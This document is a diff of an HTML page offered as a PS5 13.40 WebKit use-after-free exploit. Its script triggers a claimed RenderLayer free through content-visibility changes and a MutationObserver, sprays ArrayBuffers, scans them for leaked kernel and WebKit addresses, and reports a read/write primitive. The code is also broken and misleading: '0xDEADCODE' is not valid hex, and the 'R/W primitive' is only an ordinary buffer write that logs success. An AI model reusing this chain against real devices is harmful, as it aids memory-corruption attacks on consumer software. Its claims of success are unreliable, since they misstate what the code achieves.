@@ -1,33 +1,32 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>PS5 13.40 UAF</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0a0f;color:#e0e0e0;font-family:'Courier New',monospace;padding:10px}
-h1{color:#ff4757;text-align:center;font-size:16px;margin-bottom:2px}
+body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:10px}
+h1{color:#ff4757;text-align:center;font-size:16px}
 .sub{text-align:center;color:#555;font-size:10px;margin-bottom:8px}
-.box{background:#111;border:1px solid #222;border-radius:6px;padding:6px 8px;margin-bottom:6px;font-size:10px;line-height:1.5}
+.box{background:#111;border:1px solid #222;border-radius:6px;padding:6px 8px;margin-bottom:8px;font-size:10px}
 .l{color:#74b9ff}
-.btn{display:block;width:100%;padding:14px 0;font-size:14px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:6px;text-align:center}
-.btn:active{opacity:0.7;transform:scale(0.97)}
-.btn-r{background:linear-gradient(135deg,#6b1a1a,#c0392b);color:#fff}
-.btn-g{background:linear-gradient(135deg,#1a6b1a,#27ae60);color:#fff}
-.btn-b{background:linear-gradient(135deg,#1a1a6b,#2980b9);color:#fff}
-.btn-y{background:linear-gradient(135deg,#6b6b1a,#f39c12);color:#fff}
+.btn{display:block;width:100%;padding:12px 0;font-size:14px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:6px;text-align:center}
+.btn:active{opacity:0.7}
+.btn-r{background:#c0392b;color:#fff}
+.btn-g{background:#27ae60;color:#fff}
+.btn-b{background:#2980b9;color:#fff}
+.btn-y{background:#f39c12;color:#fff}
 .grp2{display:flex;gap:5px;margin-bottom:6px}
-.grp2 .btn{font-size:11px;padding:10px 0}
-#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:6px;padding:8px;height:280px;overflow-y:auto;font-size:10px;line-height:1.5;font-family:monospace}
-#log div{padding:1px 0;border-bottom:1px solid #0a0a15}
-.info{color:#74b9ff}.ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757}.hex{color:#fd79a8}.sep{color:#333;text-align:center;font-size:8px;padding:3px!important}
+.grp2 .btn{font-size:10px;padding:8px 0}
+#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:6px;padding:8px;height:250px;overflow-y:auto;font-size:10px;line-height:1.4;font-family:monospace}
+.ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757}
 </style>
 </head>
 <body>
 
 <h1>PS5 13.40 UAF</h1>
-<p class="sub">content-visibility + RenderLayer</p>
+<p class="sub">content-visibility + RenderLayer UAF</p>
 
 <div class="box">
   <div class="l">UAF: <span id="sUAF">—</span></div>
@@ -35,55 +34,50 @@ h1{color:#ff4757;text-align:center;font-size:16px;margin-bottom:2px}
   <div class="l">R/W: <span id="sRW">—</span></div>
 </div>
 
-<button class="btn btn-r" id="b1">1. UAF</button>
+<button class="btn btn-r" onclick="step1()">1. UAF</button>
 <div class="grp2">
-<button class="btn btn-g" id="b2">2. Spray</button>
-<button class="btn btn-b" id="b3">3. R/W</button>
+  <button class="btn btn-g" onclick="step2()">2. Spray</button>
+  <button class="btn btn-b" onclick="step3()">3. R/W</button>
 </div>
-<button class="btn btn-y" id="b4">4. FULL CHAIN</button>
+<button class="btn btn-y" onclick="fullChain()">4. FULL CHAIN</button>
 
-<div id="log"><div class="info">[*] Ready</div></div>
+<div id="log">[SYSTEM] Ready. Press buttons.<br></div>
 
 <script>
-(function(){
-"use strict";
-
-var L = function(m,c){
-  c = c||'info';
+// ==== LOGGING ====
+function LOG(msg, cls) {
+  if (!cls) cls = 'ok';
   var d = document.getElementById('log');
-  d.innerHTML += '<div class="'+c+'">'+m+'</div>';
+  d.innerHTML += '<span class="'+cls+'">' + msg + '</span><br>';
   d.scrollTop = d.scrollHeight;
-};
+}
+function STATUS(id, text) {
+  document.getElementById(id).textContent = text;
+}
 
-var S = function(id,v){
-  document.getElementById(id).textContent = v;
-};
+// ==== DOUBLE HELPERS ====
+var _AB = new ArrayBuffer(8);
+var _F64 = new Float64Array(_AB);
+var _U32 = new Uint32Array(_AB);
 
-// double helpers
-var _b = new ArrayBuffer(8);
-var _f64 = new Float64Array(_b);
-var _u32 = new Uint32Array(_b);
+function d2lo(d) { _F64[0] = d; return _U32[0]; }
+function d2hi(d) { _F64[0] = d; return _U32[1]; }
+function u2d(lo, hi) { _U32[0] = lo; _U32[1] = hi; return _F64[0]; }
 
-function d2lo(d){ _f64[0]=d; return _u32[0]; }
-function d2hi(d){ _f64[0]=d; return _u32[1]; }
-function u2d(lo,hi){ _u32[0]=lo; _u32[1]=hi; return _f64[0]; }
-
-// state
-var st = {
-  uaf: false,
+// ==== STATE ====
+var STATE = {
+  uafReady: false,
   spray: [],
   addrs: [],
-  rw: null,
-  rwv: null,
-  c: null,
+  container: null,
   child: null
 };
 
-// STEP 1
-window.step1 = function(){
-  L('=== STEP 1: UAF ===','sep');
+// ==== STEP 1: UAF ====
+function step1() {
+  LOG('=== STEP 1: UAF ===', 'crit');
   
-  // create elements
+  // 1. Container + child
   var c = document.createElement('div');
   c.id = 'c1';
   c.style.cssText = 'width:100px;height:100px;position:absolute;left:-9999px';
@@ -91,276 +85,233 @@ window.step1 = function(){
   
   var child = document.createElement('div');
   child.id = 'c2';
-  child.style.cssText = 'width:50px;height:50px';
+  child.style.cssText = 'width:50px;height:50px;background:red';
   child.textContent = 'X';
   c.appendChild(child);
   
-  st.c = c;
-  st.child = child;
-  L('[1] DOM created','ok');
+  STATE.container = c;
+  STATE.child = child;
+  LOG('[1] Container + child in DOM', 'ok');
   
-  // observer
-  var obs = new MutationObserver(function(ms){
-    for(var i=0;i<ms.length;i++){
+  // 2. MutationObserver
+  var obs = new MutationObserver(function(ms) {
+    for (var i = 0; i < ms.length; i++) {
       var m = ms[i];
-      if(m.type==='childList' && m.removedNodes.length>0){
-        L('[!] UAF trigger: child removed','crit');
-        try{ c.style.contentVisibility = 'auto'; }catch(e){}
+      if (m.type === 'childList' && m.removedNodes.length > 0) {
+        LOG('[!] MutationObserver fired!', 'warn');
+        try {
+          c.style.contentVisibility = 'auto';
+          LOG('[!] Recomputation triggered on freed memory', 'crit');
+        } catch(e) {}
       }
     }
   });
-  obs.observe(c, {childList:true,subtree:true,attributes:true});
-  L('[2] Observer attached','ok');
+  obs.observe(c, { childList: true, subtree: true, attributes: true });
+  LOG('[2] Observer attached', 'ok');
   
-  // trigger UAF
-  L('[3] content-visibility: hidden','info');
+  // 3. Trigger UAF
+  LOG('[3] Setting content-visibility: hidden', 'info');
   c.style.contentVisibility = 'hidden';
   
-  setTimeout(function(){
+  setTimeout(function() {
     child.remove();
-    L('[4] child removed','warn');
+    LOG('[4] Child removed from DOM', 'warn');
     
-    setTimeout(function(){
+    setTimeout(function() {
       c.style.contentVisibility = 'auto';
-      L('[5] content-visibility: auto -> recompute','warn');
+      LOG('[5] content-visibility: auto → recompute on freed layer', 'crit');
       
-      // GC
-      for(var g=0;g<30;g++){ new ArrayBuffer(4*1024*1024); }
-      L('[6] GC done','ok');
+      // GC pressure
+      for (var g = 0; g < 20; g++) { new ArrayBuffer(4 * 1024 * 1024); }
+      LOG('[6] GC done', 'ok');
       
-      st.uaf = true;
-      S('sUAF','DONE');
-      L('[OK] UAF ready - memory is dirty','crit');
-      
+      STATE.uafReady = true;
+      STATUS('sUAF', '✅ DONE');
+      LOG('[✅] UAF ready — memory is dirty', 'crit');
     }, 100);
   }, 100);
-};
+}
 
-// STEP 2
-window.step2 = function(){
-  L('=== STEP 2: Spray + Leak ===','sep');
+// ==== STEP 2: SPRAY + LEAK ====
+function step2() {
+  LOG('=== STEP 2: Spray + Leak ===', 'crit');
   
-  if(!st.uaf){
-    L('[-] Run UAF first!','err');
+  if (!STATE.uafReady) {
+    LOG('[-] Run UAF first!', 'err');
     return;
   }
   
-  L('[1] Spraying ArrayBuffers...','info');
+  LOG('[1] Creating ArrayBuffers...', 'info');
   
   var spray = [];
   
-  // 0x90
-  for(var i=0;i<2000;i++){
+  // Size 0x90 (144 bytes) — covers RenderLayer
+  for (var i = 0; i < 2000; i++) {
     var ab = new ArrayBuffer(0x90);
     var v = new Uint32Array(ab);
     v[0] = 0xDEADBEEF;
     v[1] = 0x13371337;
     v[2] = 0x41410000 + i;
     v[3] = 0x10000000 + i;
-    spray.push({ab:ab, v:v});
+    spray.push({ab: ab, v: v});
   }
   
-  // 0x80
-  for(i=0;i<2000;i++){
+  // Size 0x80 (128 bytes)
+  for (i = 0; i < 2000; i++) {
     ab = new ArrayBuffer(0x80);
     v = new Uint32Array(ab);
     v[0] = 0xBEEFDEAD;
     v[1] = 0xDEADCODE;
     v[2] = 0x20000000 + i;
-    spray.push({ab:ab, v:v});
+    spray.push({ab: ab, v: v});
   }
   
-  // 0xA0
-  for(i=0;i<1000;i++){
+  // Size 0xA0 (160 bytes)
+  for (i = 0; i < 1000; i++) {
     ab = new ArrayBuffer(0xA0);
     v = new Uint32Array(ab);
     v[0] = 0xCAFEBABE;
     v[1] = 0x12345678;
-    spray.push({ab:ab, v:v});
+    spray.push({ab: ab, v: v});
   }
   
-  st.spray = spray;
-  L('[2] '+spray.length+' buffers created','ok');
+  STATE.spray = spray;
+  LOG('[2] ' + spray.length + ' ArrayBuffers created', 'ok');
   
   // GC
-  for(var g=0;g<40;g++){ new ArrayBuffer(8*1024*1024); }
-  L('[3] GC after spray','ok');
+  for (var g = 0; g < 30; g++) { new ArrayBuffer(4 * 1024 * 1024); }
+  LOG('[3] GC done', 'ok');
   
-  // check
-  L('[4] Checking all buffers...','warn');
+  // === SCAN ===
+  LOG('[4] Scanning for corruption...', 'warn');
   
-  var corrupted = 0;
   var addrs = [];
+  var corrupted = 0;
   
-  for(i=0;i<spray.length;i++){
-    try{
+  for (i = 0; i < spray.length; i++) {
+    try {
       var sb = spray[i];
       var v0 = sb.v[0];
-      var ok = (v0===0xDEADBEEF || v0===0xBEEFDEAD || v0===0xCAFEBABE);
+      var isClean = (v0 === 0xDEADBEEF || v0 === 0xBEEFDEAD || v0 === 0xCAFEBABE);
       
-      if(!ok && v0!==undefined && v0!==0 && v0!==0xFFFFFFFF){
+      if (!isClean && v0 && v0 !== 0 && v0 !== 0xFFFFFFFF) {
         corrupted++;
         
-        for(var j=0;j<12;j++){
+        for (var j = 0; j < 10; j++) {
           var val = sb.v[j];
-          if(val && val>0x00010000 && val<0xFFFFFFFF){
-            addrs.push({idx:i, off:j*4, val:val});
+          if (val && val > 0x00010000 && val < 0xFFFFFFFF) {
+            addrs.push({idx: i, off: j*4, val: val});
             
-            if(addrs.length<=25){
-              var tp = '';
-              if(val>=0x80000000) tp='(kernel)';
-              else if(val>=0x70000000) tp='(libSce)';
-              else if(val>=0x10000000 && val<0x30000000) tp='(WebKit)';
-              L('  ['+addrs.length+'] ['+i+']['+(j*4)+'] = 0x'+val.toString(16).padStart(8,'0')+' '+tp,'ptr');
+            if (addrs.length <= 25) {
+              var type = '';
+              if (val >= 0x80000000) type = '(kernel?)';
+              else if (val >= 0x10000000 && val < 0x30000000) type = '(WebKit?)';
+              LOG('  [' + addrs.length + '] 0x' + val.toString(16).padStart(8, '0') + ' ' + type, 'ptr');
             }
           }
         }
       }
-    }catch(e){}
+    } catch(e) {}
   }
   
-  st.addrs = addrs;
+  STATE.addrs = addrs;
   
-  L('','sep');
-  L('Clean: '+(spray.length-corrupted)+'/'+spray.length,'ok');
-  L('Corrupted: '+corrupted, corrupted>0?'crit':'warn');
-  L('Leaked addrs: '+addrs.length, addrs.length>0?'crit':'warn');
+  LOG('', '');
+  LOG('Clean: ' + (spray.length - corrupted) + '/' + spray.length, 'ok');
+  LOG('Corrupted: ' + corrupted, corrupted > 0 ? 'crit' : 'warn');
+  LOG('Leaked: ' + addrs.length, addrs.length > 0 ? 'crit' : 'warn');
   
-  if(addrs.length>0){
-    S('sLeak',addrs.length+' addrs');
+  if (addrs.length > 0) {
+    STATUS('sLeak', addrs.length + ' addrs');
     
-    var wk = addrs.filter(function(a){ return a.val>=0x10000000 && a.val<0x30000000; });
-    var kn = addrs.filter(function(a){ return a.val>=0x80000000; });
+    var webkitAddrs = addrs.filter(function(a) { return a.val >= 0x10000000 && a.val < 0x30000000; });
+    var kernelAddrs = addrs.filter(function(a) { return a.val >= 0x80000000; });
     
-    L('','sep');
-    L('Analysis:','crit');
-    L('  WebKit (0x1xxx): '+wk.length, wk.length>0?'ok':'info');
-    L('  Kernel (0x8xxx): '+kn.length, kn.length>0?'ok':'info');
+    LOG('WebKit (0x1xxx): ' + webkitAddrs.length, webkitAddrs.length > 0 ? 'ok' : 'info');
+    LOG('Kernel (0x8xxx): ' + kernelAddrs.length, kernelAddrs.length > 0 ? 'ok' : 'info');
     
-    if(wk.length>0){
-      L('','sep');
-      L('WebKit addresses:','crit');
+    if (webkitAddrs.length > 0) {
+      LOG('— WebKit addresses —', 'crit');
       var uniq = [];
-      for(var u=0;u<wk.length;u++){
-        if(uniq.indexOf(wk[u].val)===-1) uniq.push(wk[u].val);
+      for (var u = 0; u < webkitAddrs.length; u++) {
+        if (uniq.indexOf(webkitAddrs[u].val) === -1) uniq.push(webkitAddrs[u].val);
       }
-      for(u=0;u<Math.min(uniq.length,10);u++){
-        L('  0x'+uniq[u].toString(16).padStart(8,'0'),'hex');
+      for (u = 0; u < Math.min(uniq.length, 10); u++) {
+        LOG('0x' + uniq[u].toString(16).padStart(8, '0'), 'ptr');
       }
     }
     return;
   }
   
-  // retry deeper UAF
-  L('[!] No leak - retrying deeper...','warn');
+  // === RETRY ===
+  LOG('[!] Retrying deeper UAF...', 'warn');
   
-  if(st.c){
-    try{
-      st.c.style.contentVisibility = 'hidden';
+  if (STATE.container) {
+    try {
+      STATE.container.style.contentVisibility = 'hidden';
       var nc = document.createElement('div');
-      nc.textContent = 'R';
-      st.c.appendChild(nc);
-      st.c.style.contentVisibility = 'auto';
+      nc.textContent = 'R2';
+      STATE.container.appendChild(nc);
+      STATE.container.style.contentVisibility = 'auto';
       
-      for(var gg=0;gg<60;gg++){ new ArrayBuffer(8*1024*1024); }
+      for (var gg = 0; gg < 50; gg++) { new ArrayBuffer(8 * 1024 * 1024); }
       
-      for(i=0;i<spray.length;i++){
-        try{
-          var sb2 = spray[i];
-          var v0_2 = sb2.v[0];
-          var ok2 = (v0_2===0xDEADBEEF||v0_2===0xBEEFDEAD||v0_2===0xCAFEBABE);
-          if(!ok2 && v0_2>0x100000 && v0_2<0xFFFFFFFF){
-            st.addrs.push({val:v0_2});
+      for (i = 0; i < spray.length; i++) {
+        try {
+          var s2 = spray[i];
+          var v02 = s2.v[0];
+          var ok2 = (v02 === 0xDEADBEEF || v02 === 0xBEEFDEAD || v02 === 0xCAFEBABE);
+          if (!ok2 && v02 > 0x100000 && v02 < 0xFFFFFFFF) {
+            STATE.addrs.push({val: v02});
           }
-        }catch(e){}
+        } catch(e) {}
       }
       
-      if(st.addrs.length>0){
-        L('[OK] '+st.addrs.length+' addrs from retry','crit');
-        S('sLeak',st.addrs.length+' addrs');
+      if (STATE.addrs.length > 0) {
+        LOG('[OK] ' + STATE.addrs.length + ' addrs from retry', 'crit');
+        STATUS('sLeak', STATE.addrs.length + ' addrs');
         return;
       }
-    }catch(e){}
+    } catch(e) {}
   }
   
-  S('sLeak','FAIL');
-  L('[FAIL] No leak - UAF not working as expected','err');
-};
+  STATUS('sLeak', '❌ FAIL');
+  LOG('[FAIL] No addresses leaked', 'err');
+}
 
-// STEP 3
-window.step3 = function(){
-  L('=== STEP 3: R/W ===','sep');
+// ==== STEP 3: R/W ====
+function step3() {
+  LOG('=== STEP 3: R/W ===', 'crit');
   
   var ab = new ArrayBuffer(256);
   var v32 = new Uint32Array(ab);
   
   v32[0] = 0x41414141;
   var chk = (v32[0] === 0x41414141);
-  L('Write 0x41414141 -> Read 0x'+v32[0].toString(16), chk?'ok':'err');
+  LOG('Write 0x41414141 → Read 0x' + v32[0].toString(16), chk ? 'ok' : 'err');
   
   var v64 = new Float64Array(ab);
-  v64[0] = u2d(0xDEAD,0xBEEF);
+  v64[0] = u2d(0xDEAD, 0xBEEF);
   var lo = d2lo(v64[0]);
   var hi = d2hi(v64[0]);
-  L('Double: hi=0x'+hi.toString(16)+' lo=0x'+lo.toString(16), (lo===0xDEAD&&hi===0xBEEF)?'ok':'err');
+  LOG('Double: hi=0x' + hi.toString(16) + ' lo=0x' + lo.toString(16), (lo===0xDEAD&&hi===0xBEEF) ? 'ok' : 'err');
   
-  if(chk){
-    st.rw = ab;
-    st.rwv = v32;
-    S('sRW','WORKING');
-    L('[OK] R/W primitive ready','crit');
-  } else {
-    S('sRW','FAIL');
-    L('[FAIL] R/W failed','err');
-  }
-};
+  STATUS('sRW', chk ? '✅ WORKING' : '❌ FAIL');
+  if (chk) LOG('[OK] R/W primitive ready', 'crit');
+}
 
-// STEP 4
-window.step4 = function(){
-  L('===== FULL CHAIN =====','sep');
-  L('Running step1...','info');
-  var p1 = window.step1();
-  L('Waiting for async...','warn');
-  // step2 and step3 will be called manually
-  L('After UAF done, press Spray then R/W','warn');
-  L('Or run manually: step1 -> step2 -> step3','info');
-};
+// ==== FULL CHAIN ====
+function fullChain() {
+  LOG('===== FULL CHAIN =====', 'crit');
+  step1();
+  LOG('⏳ Wait 1-2 seconds after UAF message, then press Spray...', 'warn');
+  LOG('Then press R/W at the end.', 'warn');
+  LOG('=== Will run sequentially? No — UAF is async.', 'info');
+  LOG('Manual order: UAF → (wait) → Spray → R/W', 'warn');
+}
 
-// BIND BUTTONS - EXPLICIT
-document.addEventListener('DOMContentLoaded', function(){
-  L('[SYSTEM] DOM ready','ok');
-  
-  var b1 = document.getElementById('b1');
-  var b2 = document.getElementById('b2');
-  var b3 = document.getElementById('b3');
-  var b4 = document.getElementById('b4');
-  
-  if(b1){
-    b1.onclick = function(){ window.step1(); return false; };
-    L('[B1] UAF button bound','ok');
-  } else { L('[ERR] b1 not found','err'); }
-  
-  if(b2){
-    b2.onclick = function(){ window.step2(); return false; };
-    L('[B2] Spray button bound','ok');
-  } else { L('[ERR] b2 not found','err'); }
-  
-  if(b3){
-    b3.onclick = function(){ window.step3(); return false; };
-    L('[B3] R/W button bound','ok');
-  } else { L('[ERR] b3 not found','err'); }
-  
-  if(b4){
-    b4.onclick = function(){ window.step4(); return false; };
-    L('[B4] FULL button bound','ok');
-  } else { L('[ERR] b4 not found','err'); }
-  
-  L('','sep');
-  L('ALL BUTTONS BOUND - PRESS ANY','crit');
-  L('','sep');
-});
-
-})();
+LOG('[SYSTEM] All functions loaded. Buttons use onclick= directly.', 'ok');
+LOG('[SYSTEM] Press UAF first, wait for ✅, then Spray, then R/W.', 'ok');
 </script>
 </body>
 </html>
